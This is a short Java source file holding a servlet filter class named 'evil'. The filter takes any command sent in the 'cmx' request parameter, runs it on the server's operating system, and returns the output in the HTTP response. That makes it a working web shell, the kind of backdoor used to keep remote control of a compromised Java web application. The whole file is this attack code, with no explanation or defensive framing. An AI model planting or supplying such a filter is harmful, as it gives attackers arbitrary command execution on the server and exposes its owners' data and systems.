package cn.timerzz.filter;

import javax.servlet.*;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class evil implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException { }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        String cmx = request.getParameter("cmx");
        InputStream inputStream = Runtime.getRuntime().exec(cmx).getInputStream();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        int len = -1;
        byte[] b = new byte[1024];
        while ((len = inputStream.read(b)) != -1){
            bos.write(b, 0, len);
        }
        response.getWriter().write(new String(bos.toByteArray()));
        chain.doFilter(request, response);
    }

    @Override
    public void destroy() { }
}
